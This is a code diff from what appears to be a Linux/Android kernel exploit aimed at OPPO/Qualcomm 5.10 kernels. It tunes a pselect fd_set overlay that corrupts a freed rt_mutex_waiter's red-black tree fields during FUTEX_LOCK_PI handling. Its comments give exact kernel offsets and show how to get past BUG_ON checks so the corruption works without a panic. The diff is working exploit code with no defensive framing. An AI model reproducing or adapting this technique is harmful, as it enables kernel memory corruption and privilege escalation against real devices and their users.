@@ -89,8 +89,10 @@ void open_selected_fds(
     }
   }
   close(high_read);
-  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
-  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
+  /* No artificial except-set fd: FD_SET(NFDS-1, ex) would put bit 63 into
+   * ex[1] = bits[5] = waiter->pi_tree_entry.rb_left (0x8000000000000000)
+   * and the map already owns word 7. fd 0 (tree_pc bit) keeps select()
+   * blocked on the timerfd. */
 }
 
 void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
@@ -107,24 +109,27 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
 #ifdef PSELECT_WORDS_V5_10
     /* 5.10 rt_mutex_waiter: tree_entry@0, pi_tree_entry@0x18, task@0x30,
      * lock@0x38, list@0x40 -- no augment prio/deadline, no wake_state.
-     * NOTE: word 9 (waiter->lock) is NOT overwritten: OPPO/QC 5.10
-     * remove_waiter has BUG_ON(rt_mutex_top_waiter(lock)->lock != lock)
-     * (brk #0x800) and the original lock field (real pi_mutex) must
-     * survive the fd_set overlay or the kernel panics on entry.
+     * ONLY words 2..7 are placed: PSELECT_ROUTE_NFDS=128 keeps the copy at
+     * 2 words/set = bits[0..5] = waiter+0x00..+0x28, so task/lock/list are
+     * NOT COPIED AT ALL and keep their real kernel-written values. This is
+     * required: OPPO/QC 5.10 BUG_ON(root->lock != lock) (brk #0x800) in
+     * task_blocks_on_rt_mutex (0x1eaa28), remove_waiter (0x1eb540) and
+     * mark_wakeup_next_waiter (0x1ea138); b2cc201 only removed the explicit
+     * word-9 write but FD_ZERO + the full fd_set copy still zeroed lock and
+     * the consumer's first FUTEX_LOCK_PI panicked on enqueue.
      * tree_pc = 1 (RB_BLACK): task_blocks_on_rt_mutex() re-inserts the
      * consumer waiter under the stale fake node; rb_insert_color() sees
      * the fake parent as RED (pc=0) and dereferences a NULL grandparent
      * (fake's rb_parent is 0) -> panic. Black marks it as root and the
-     * insert loop breaks without touching the grandparent. */
+     * insert loop breaks without touching the grandparent.
+     * W->task stays the real waiter thread (prio 120, tie with consumer),
+     * so the rb compare sends the consumer waiter to W's right child slot. */
     {2, 1, "tree_pc"},
     {3, 0, "tree_right"},
     {4, 0, "tree_left"},
     {5, 0, "pi_parent"},
     {6, 0, "pi_right"},
     {7, 0, "pi_left"},
-    {8, fake_task, "task"},
-    {10, 0, "list_next"},
-    {11, 0, "list_prev"},
 #else
     {2, 0, "tree_pc"},
     {3, 0, "tree_right"},
